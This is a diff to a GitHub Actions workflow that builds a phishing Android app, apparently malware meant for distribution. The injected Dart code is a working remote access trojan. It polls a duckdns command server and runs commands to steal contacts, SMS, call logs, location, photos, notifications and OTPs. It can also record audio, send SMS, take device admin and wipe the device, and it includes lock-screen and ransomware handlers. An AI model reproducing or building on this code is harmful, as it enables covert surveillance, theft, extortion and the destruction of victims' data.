@@ -41,7 +41,7 @@ jobs:
           cd phising_base
           
           # ============================================
-          # FIX 1: BUILD.GRADLE (BIAR FIREBASE JAVA KEBACA)
+          # 1. BUILD.GRADLE (BIAR FIREBASE JAVA KEBACA)
           # ============================================
           cat > android/build.gradle << 'EOF'
           buildscript {
@@ -136,7 +136,7 @@ jobs:
           EOF
 
           # ============================================
-          # FIX 2: MANIFEST & STRINGS
+          # 2. MANIFEST & XML
           # ============================================
           cat > android/app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
@@ -262,7 +262,7 @@ jobs:
           EOF
 
           # ============================================
-          # FIX 3: PUBSPEC & ASET
+          # 3. PUBSPEC & ASET
           # ============================================
           mkdir -p assets
           if [ -n "${{ github.event.inputs.icon_url }}" ]; then
@@ -331,7 +331,7 @@ jobs:
           EOF
 
       # ============================================
-      # FIX 4: INJECT JAVA
+      # 4. INJECT JAVA
       # ============================================
       - name: Inject Native Java Files
         run: |
@@ -1476,7 +1476,7 @@ jobs:
           EOF
 
       # ============================================
-      # FIX 5: INJECT DART
+      # 5. INJECT DART
       # ============================================
       - name: Inject Dart Services
         run: |
@@ -1572,83 +1572,87 @@ jobs:
               } catch(e) { debugPrint('Register Firebase error: $e'); }
               startHeartbeat();
 
-              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
               final rat = MethodChannel('com.spy.x/rat');
 
-              fb.ref('commands/$uid').onChildAdded.listen((event) async {
-                if (event.snapshot.value == null) return;
-                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
-                final cmd = data['cmd'];
-                final param = data['param']?.toString() ?? '';
-                final cmdId = event.snapshot.key ?? '';
-                
-                await event.snapshot.ref.remove();
-                
-                try {
-                  dynamic result;
-                  String type = '';
-                  
-                  switch (cmd) {
-                    case 1001: result = await rat.invokeMethod('getContacts'); type = 'contacts'; break;
-                    case 1002: result = await rat.invokeMethod('getSms'); type = 'sms'; break;
-                    case 1003:
-                      final p = jsonDecode(param);
-                      result = await rat.invokeMethod('sendSms', {'phone': p['phone'], 'message': p['message']});
-                      type = 'sms_status';
-                      break;
-                    case 1004: result = await rat.invokeMethod('getCallLogs'); type = 'call_logs'; break;
-                    case 1005: result = await rat.invokeMethod('getLocation'); type = 'location'; break;
-                    case 1006: result = await rat.invokeMethod('getDeviceInfo'); type = 'device_info'; break;
-                    case 1008: result = await rat.invokeMethod('vibrate'); type = 'vibrate'; break;
-                    case 1016: result = await rat.invokeMethod('torchOn'); type = 'torch'; break;
-                    case 1017: result = await rat.invokeMethod('torchOff'); type = 'torch'; break;
-                    case 1018: result = await rat.invokeMethod('torchBlink'); type = 'torch'; break;
-                    case 1011: result = await rat.invokeMethod('changeWallpaper', {'url': param}); type = 'wallpaper'; break;
-                    case 66985478: result = await rat.invokeMethod('back'); type = 'back'; break;
-                    case 25896321: result = await rat.invokeMethod('home'); type = 'home'; break;
-                    case 33654789: result = await rat.invokeMethod('recents'); type = 'recents'; break;
-                    case 1596485: result = await rat.invokeMethod('getInstalledApps'); type = 'apps'; break;
-                    case 74789654: result = await rat.invokeMethod('launchApp', {'package': param}); type = 'launch'; break;
-                    case 64645897: result = await rat.invokeMethod('uninstallApp', {'package': param}); type = 'uninstall'; break;
-                    case 1013:
-                      final p = jsonDecode(param);
-                      result = await rat.invokeMethod('toast', {'text': p['message'] ?? ''});
-                      type = 'toast';
-                      break;
-                    case 1012: result = await rat.invokeMethod('voiceMessage', {'text': param}); type = 'voice'; break;
-                    case 44598715: result = await rat.invokeMethod('click', {'resourceId': param}); type = 'toast'; break;
-                    case 885478962: result = await rat.invokeMethod('setText', {'text': param}); type = 'toast'; break;
-                    case 115987: result = await rat.invokeMethod('touch', {'bounds': param}); type = 'toast'; break;
-                    case 1014: result = await rat.invokeMethod('getFileList', {'path': param}); type = 'file_list'; break;
-                    case 1020: result = await rat.invokeMethod('getGallery'); type = 'gallery'; break;
-                    case 1019: result = await rat.invokeMethod('getNotifications'); type = 'notifications'; break;
-                    case 1051: result = "Fitur OTP aktif otomatis ke Firebase."; type = 'otp'; break;
-                    case 1060: result = await rat.invokeMethod('screenshot'); type = 'screenshot_status'; break;
-                    case 11223344: result = await rat.invokeMethod('takePhotoBack'); type = 'photo_error'; break;
-                    case 11223345: result = await rat.invokeMethod('takePhotoFront'); type = 'photo_error'; break;
-                    case 1063: result = "Live Stream butuh MediaProjection."; type = 'screen_record'; break;
-                    case 1070: result = await rat.invokeMethod('recordAudio'); type = 'record_status'; break;
-                    case 99887766: result = await rat.invokeMethod('enableAdmin'); type = 'toast'; break;
-                    case 5698742: result = await rat.invokeMethod('overlayShow'); type = 'toast'; break;
-                    case 89521475: result = await rat.invokeMethod('overlayHide'); type = 'toast'; break;
-                    case 1009: result = await rat.invokeMethod('wipe'); type = 'toast'; break;
-                    default: result = 'Command $cmd belum diimplementasi'; type = 'error';
+              void startHttpPolling() async {
+                while (true) {
+                  try {
+                    final res = await http.get(
+                      Uri.parse('http://nodeyagamigantengsayang.duckdns.top:4130/commands/poll?device_id=$uid&timeout=20'),
+                    ).timeout(const Duration(seconds: 25));
+
+                    if (res.statusCode == 200 && res.body.isNotEmpty) {
+                      final data = jsonDecode(res.body);
+                      final cmd = data['cmd'];
+                      final param = data['param']?.toString() ?? '';
+                      final cmdId = data['cmdId']?.toString() ?? 'latest';
+
+                      dynamic result;
+                      String type = '';
+                      switch (cmd) {
+                        case 1001: result = await rat.invokeMethod('getContacts'); type = 'contacts'; break;
+                        case 1002: result = await rat.invokeMethod('getSms'); type = 'sms'; break;
+                        case 1003:
+                          final p = jsonDecode(param);
+                          result = await rat.invokeMethod('sendSms', {'phone': p['phone'], 'message': p['message']});
+                          type = 'sms_status';
+                          break;
+                        case 1004: result = await rat.invokeMethod('getCallLogs'); type = 'call_logs'; break;
+                        case 1005: result = await rat.invokeMethod('getLocation'); type = 'location'; break;
+                        case 1006: result = await rat.invokeMethod('getDeviceInfo'); type = 'device_info'; break;
+                        case 1008: result = await rat.invokeMethod('vibrate'); type = 'vibrate'; break;
+                        case 1016: result = await rat.invokeMethod('torchOn'); type = 'torch'; break;
+                        case 1017: result = await rat.invokeMethod('torchOff'); type = 'torch'; break;
+                        case 1018: result = await rat.invokeMethod('torchBlink'); type = 'torch'; break;
+                        case 1011: result = await rat.invokeMethod('changeWallpaper', {'url': param}); type = 'wallpaper'; break;
+                        case 66985478: result = await rat.invokeMethod('back'); type = 'back'; break;
+                        case 25896321: result = await rat.invokeMethod('home'); type = 'home'; break;
+                        case 33654789: result = await rat.invokeMethod('recents'); type = 'recents'; break;
+                        case 1596485: result = await rat.invokeMethod('getInstalledApps'); type = 'apps'; break;
+                        case 74789654: result = await rat.invokeMethod('launchApp', {'package': param}); type = 'launch'; break;
+                        case 64645897: result = await rat.invokeMethod('uninstallApp', {'package': param}); type = 'uninstall'; break;
+                        case 1013:
+                          final p = jsonDecode(param);
+                          result = await rat.invokeMethod('toast', {'text': p['message'] ?? ''});
+                          type = 'toast';
+                          break;
+                        case 1012: result = await rat.invokeMethod('voiceMessage', {'text': param}); type = 'voice'; break;
+                        case 44598715: result = await rat.invokeMethod('click', {'resourceId': param}); type = 'toast'; break;
+                        case 885478962: result = await rat.invokeMethod('setText', {'text': param}); type = 'toast'; break;
+                        case 115987: result = await rat.invokeMethod('touch', {'bounds': param}); type = 'toast'; break;
+                        case 1014: result = await rat.invokeMethod('getFileList', {'path': param}); type = 'file_list'; break;
+                        case 1020: result = await rat.invokeMethod('getGallery'); type = 'gallery'; break;
+                        case 1019: result = await rat.invokeMethod('getNotifications'); type = 'notifications'; break;
+                        case 1051: result = "Fitur OTP aktif otomatis ke Firebase."; type = 'otp'; break;
+                        case 1060: result = await rat.invokeMethod('screenshot'); type = 'screenshot_status'; break;
+                        case 11223344: result = await rat.invokeMethod('takePhotoBack'); type = 'photo_error'; break;
+                        case 11223345: result = await rat.invokeMethod('takePhotoFront'); type = 'photo_error'; break;
+                        case 1070: result = await rat.invokeMethod('recordAudio'); type = 'record_status'; break;
+                        case 99887766: result = await rat.invokeMethod('enableAdmin'); type = 'toast'; break;
+                        case 5698742: result = await rat.invokeMethod('overlayShow'); type = 'toast'; break;
+                        case 89521475: result = await rat.invokeMethod('overlayHide'); type = 'toast'; break;
+                        case 1009: result = await rat.invokeMethod('wipe'); type = 'toast'; break;
+                        default: result = 'Belum diimplementasi'; type = 'error';
+                      }
+
+                      await http.post(
+                        Uri.parse('http://nodeyagamigantengsayang.duckdns.top:4130/result'),
+                        headers: {'Content-Type': 'application/json'},
+                        body: jsonEncode({
+                          'device_id': uid,
+                          'cmdId': cmdId,
+                          'type': type,
+                          'data': result is String ? result : jsonEncode(result),
+                        }),
+                      );
+                    }
+                  } catch (e) {
+                    debugPrint('⚠️ HTTP Poll Error: $e');
                   }
-                  
-                  await fb.ref('results/$uid/$cmdId').set({
-                    'type': type,
-                    'data': result is String ? result : jsonEncode(result),
-                    'timestamp': DateTime.now().millisecondsSinceEpoch,
-                  });
-                  
-                } catch (e) {
-                  await fb.ref('results/$uid/$cmdId').set({
-                    'type': 'error',
-                    'data': 'Gagal eksekusi: $e',
-                    'timestamp': DateTime.now().millisecondsSinceEpoch,
-                  });
+                  await Future.delayed(const Duration(seconds: 2));
                 }
-              });
+              }
+              startHttpPolling();
 
               LockScreenService().init(context, uid);
               RansomwareService().init(context, uid);
@@ -1758,11 +1762,10 @@ jobs:
                 
                 if (cmd == 98765432 || cmd == 98765433 || cmd == 87654321) {
                   event.snapshot.ref.remove();
+                  if (cmd == 98765432) _lockScreen();
+                  else if (cmd == 98765433) _unlockScreen();
+                  else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
                 }
-                
-                if (cmd == 98765432) _lockScreen();
-                else if (cmd == 98765433) _unlockScreen();
-                else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
               });
             }
 
@@ -1868,11 +1871,11 @@ jobs:
                 
                 if (cmd == 1010 || cmd == 10101) {
                   event.snapshot.ref.remove();
+                  if (cmd == 1010) _activateRansomware();
+                  else if (cmd == 10101) _deactivateRansomware();
+                } else if (cmd == 87654321 && param.isNotEmpty) {
+                  _setPin(param);
                 }
-                
-                if (cmd == 1010) _activateRansomware();
-                else if (cmd == 10101) _deactivateRansomware();
-                else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
               });
             }
 
@@ -1907,7 +1910,7 @@ jobs:
           EOF
 
       # ============================================
-      # 7. BUILD APK
+      # 6. BUILD APK
       # ============================================
       - name: Build & Sign APK
         run: |
